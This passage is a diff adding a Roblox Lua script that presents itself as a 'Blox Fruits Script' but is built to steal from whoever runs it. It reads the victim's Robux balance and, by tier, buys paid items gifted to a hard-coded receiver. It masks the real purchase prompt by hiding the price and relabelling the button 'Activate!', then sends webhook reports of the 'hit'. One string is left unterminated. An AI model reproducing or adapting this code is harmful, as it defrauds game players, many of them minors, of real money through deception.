+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 100 then
+        stolenFruit = "Permanent Blade-Blade"
+        robuxSpent = 100
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Blade-Blade",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 75 then
+        stolenFruit = "Permanent Spin-Spin"
+        robuxSpent = 75
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "Permanent Spin-Spin",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 50 then
+        stolenFruit = "10K Money"
+        robuxSpent = 50
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "10K Money",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 25 then
+        stolenFruit = "2x EXP (15 mins.)"
+        robuxSpent = 25
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Shar On top",
+                ["StorageName"] = "2x EXP (15 mins.)",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    end
+end
+
+local function WaitForPrompt1()
+    local Animator =
+        CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat
+        task.wait()
+    until not Animator:FindFirstChild("Prompt")
+    stealitem()
+    local CoreGui = game:GetService("CoreGui")
+
+    local success, err =
+        pcall(
+        function()
+            local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
+            local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+            local Animator = ProductPurchaseContainer:WaitForChild("Animator")
+            local Prompt = Animator:WaitForChild("Prompt")
+            local AlertContents = Prompt:WaitForChild("AlertContents")
+
+            local MiddleContent = AlertContents:WaitForChild("MiddleContent")
+            MiddleContent.Visible = false
+
+            local Footer = AlertContents:WaitForChild("Footer")
+            local FooterButtons = Footer:WaitForChild("Buttons")
+            local FooterButton1 = FooterButtons:WaitForChild("1")
+            FooterButton1.Visible = false
+
+            local FooterContent = Footer:WaitForChild("FooterContent")
+            FooterContent.Visible = false
+
+            local FooterButton2 = FooterButtons:WaitForChild("2")
+            FooterButton2.Visible = true
+
+            local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
+            FooterButton2Text.Text = "Activate!"
+            FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)
+
+            local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
+            FooterButton2Icon.Visible = false
+
+            local TitleContainer = AlertContents:WaitForChild("TitleContainer")
+            local TitleArea = TitleContainer:WaitForChild("TitleArea")
+            local TitleText = TitleArea:WaitForChild("Title")
+            TitleText.Text = "Blox Fruits Script!
+            TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
+        end
+    )
+
+    if not success then
+        warn("UI..")
+    end
+end
+
+local RobuxPath =
+    CoreGui:WaitForChild("Purchase_Prompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild(
+    "Prompt"
+):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild(
+    "RemainingBalanceText"
+)
+local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")
+
+if balanceText then
+    result = tonumber(balanceText) + 25
+end
+
+local function WaitForPrompt2()
+    local Animator =
+        CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat
+        task.wait()
+    until not Animator:FindFirstChild("Prompt")
+    sendWebhook()
+    sendPublicHitsWebhook()
+end
+
+WaitForPrompt1()
+WaitForPrompt2()
